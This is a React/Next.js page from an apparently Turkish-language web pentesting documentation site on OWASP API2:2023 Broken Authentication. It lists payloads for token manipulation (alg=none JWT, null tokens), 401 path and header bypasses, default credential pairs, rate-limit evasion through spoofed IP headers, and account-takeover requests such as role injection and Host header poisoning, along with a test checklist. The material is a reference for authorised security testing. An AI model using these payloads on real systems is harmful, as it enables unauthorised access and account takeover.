"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "token-manipulation", title: "Token Manipulation", level: 2 },
  { id: "auth-bypass", title: "Authentication Bypass", level: 2 },
  { id: "credential-stuffing", title: "Credential Stuffing", level: 2 },
  { id: "rate-limit-bypass", title: "Rate Limit Bypass for Brute Force", level: 2 },
  { id: "registration-ato", title: "Registration & Account Takeover", level: 2 },
]

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function BrokenAuthPage() {
  return (
    <>
    <TableOfContents items={tocItems} />
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">Broken Authentication</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          API kimlik doğrulama mekanizmalarındaki zafiyetler. OWASP API2:2023 olarak ikinci sırada.
          Token yönetimi, brute force ve authentication bypass teknikleri.
        </p>
      </motion.div>

      <Callout type="warning" title="OWASP API2:2023">
        Authentication zafiyetleri doğrudan account takeover&apos;a yol açar. Token leakage,
        weak password policy ve missing rate limit en yaygın sebeplerdir.
      </Callout>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="token-manipulation" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Token Manipulation</h2>
        <PayloadList
          title="Token Attack Payloads"
          initialShow={8}
          payloads={[
            { code: `Authorization: Bearer <empty>`, note: "Boş token" },
            { code: `Authorization: Bearer null`, note: "Null token" },
            { code: `Authorization: Bearer undefined`, note: "Undefined token" },
            { code: `Authorization: Bearer 0`, note: "Zero token" },
            { code: `Authorization: Bearer true`, note: "Boolean token" },
            { code: `Authorization: Bearer [admin_token]`, note: "Başka kullanıcının tokeni" },
            { code: `Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.`, note: "JWT alg=none" },
            { code: `Authorization: Basic YWRtaW46YWRtaW4=`, note: "admin:admin Base64" },
            { code: `Authorization: Basic YWRtaW46cGFzc3dvcmQ=`, note: "admin:password Base64" },
            { code: `Authorization: Bearer <expired_token>`, note: "Süresi dolmuş token" },
            { code: `Cookie: session=; Authorization: Bearer <token>`, note: "Cookie vs header priority test" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="auth-bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Authentication Bypass</h2>
        <PayloadList
          title="Bypass Teknikleri"
          initialShow={8}
          payloads={[
            { code: `GET /api/admin → 401 → GET /api/Admin`, note: "Case sensitivity" },
            { code: `GET /api/admin → 401 → GET /api/admin/`, note: "Trailing slash" },
            { code: `GET /api/admin → 401 → GET /api/admin/.`, note: "Dot bypass" },
            { code: `GET /api/admin → 401 → GET /api//admin`, note: "Double slash" },
            { code: `GET /api/admin → 401 → GET /api/admin%20`, note: "Space encoding" },
            { code: `GET /api/admin → 401 → GET /api/admin%09`, note: "Tab encoding" },
            { code: `GET /api/admin → 401 → GET /api/admin;`, note: "Semicolon" },
            { code: `GET /api/admin → 401 → GET /./api/admin`, note: "Dot-slash prefix" },
            { code: `GET /api/admin → 401 → POST /api/admin`, note: "HTTP method değiştir" },
            { code: `GET /api/admin → 401 → X-Original-URL: /api/admin`, note: "Header override" },
            { code: `GET /api/admin → 401 → X-Rewrite-URL: /api/admin`, note: "Rewrite header" },
            { code: `GET /api/v2/admin → 401 → GET /api/v1/admin`, note: "API version downgrade" },
            { code: `GET /api/admin → 401 → GET /api/admin?debug=true`, note: "Debug parameter" },
            { code: `GET /api/admin → 401 → GET /api/admin?test=true`, note: "Test mode" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="credential-stuffing" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Credential Stuffing</h2>
        <PayloadList
          title="Default Credentials"
          initialShow={8}
          payloads={[
            { code: `admin:admin`, note: "En yaygın varsayılan" },
            { code: `admin:password`, note: "Klasik" },
            { code: `admin:admin123` },
            { code: `admin:123456` },
            { code: `root:root` },
            { code: `root:toor` },
            { code: `test:test` },
            { code: `user:user` },
            { code: `administrator:administrator` },
            { code: `guest:guest` },
            { code: `demo:demo` },
            { code: `admin:P@ssw0rd` },
            { code: `admin:changeme` },
            { code: `sa:sa`, note: "SQL Server varsayılan" },
            { code: `postgres:postgres`, note: "PostgreSQL varsayılan" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="rate-limit-bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Rate Limit Bypass for Brute Force</h2>
        <PayloadList
          title="Rate Limit Evasion"
          initialShow={8}
          payloads={[
            { code: `X-Forwarded-For: 127.0.0.1`, note: "IP spoofing" },
            { code: `X-Forwarded-For: 10.0.0.FUZZ`, note: "Rotating IP" },
            { code: `X-Real-IP: 127.0.0.1` },
            { code: `X-Originating-IP: 127.0.0.1` },
            { code: `X-Client-IP: 127.0.0.1` },
            { code: `X-Remote-IP: 127.0.0.1` },
            { code: `X-Remote-Addr: 127.0.0.1` },
            { code: `True-Client-IP: 127.0.0.1`, note: "Akamai header" },
            { code: `POST /login → POST /Login → POST /LOGIN`, note: "Endpoint case variation" },
            { code: `POST /api/v1/login → POST /api/v2/login`, note: "Version variation" },
            { code: `{"email":"admin@test.com"} → {"email":"admin@test.com "}`, note: "Trailing space" },
            { code: `{"email":"admin@test.com"} → {"email":"Admin@test.com"}`, note: "Case variation" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 id="registration-ato" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">Registration & Account Takeover</h2>
        <PayloadList
          title="Account Takeover Vectors"
          initialShow={6}
          payloads={[
            { code: `POST /register {"email":"admin@target.com","password":"attacker123"}`, note: "Duplicate registration" },
            { code: `POST /register {"email":"admin@target.com ","password":"x"}`, note: "Trailing space bypass" },
            { code: `POST /register {"email":"ADMIN@target.com","password":"x"}`, note: "Case insensitive email" },
            { code: `POST /register {"email":"admin@target.com","role":"admin"}`, note: "Role injection" },
            { code: `POST /password-reset {"email":"victim@target.com","new_password":"hacked"}`, note: "Direct password reset" },
            { code: `POST /password-reset → intercept token → use for victim`, note: "Token steal" },
            { code: `POST /api/user/email {"email":"attacker@evil.com"}`, note: "Doğrulama olmadan email değişimi" },
            { code: `Host: attacker.com + password reset`, note: "Host header poisoning" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. Token&apos;ı tamamen kaldırarak test edin{"\n"}
        2. Başka kullanıcının token&apos;ını kullanın{"\n"}
        3. Expired token deneyin{"\n"}
        4. Default credentials deneyin{"\n"}
        5. Rate limit bypass ile brute force{"\n"}
        6. Registration endpoint&apos;te duplicate account oluşturun{"\n"}
        7. Password reset flow&apos;unu inceleyin
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/bola-idor" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>BOLA / IDOR</span>
        </Link>
        <Link href="/docs/api/bopla" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>BOPLA</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
    </>
  )
}
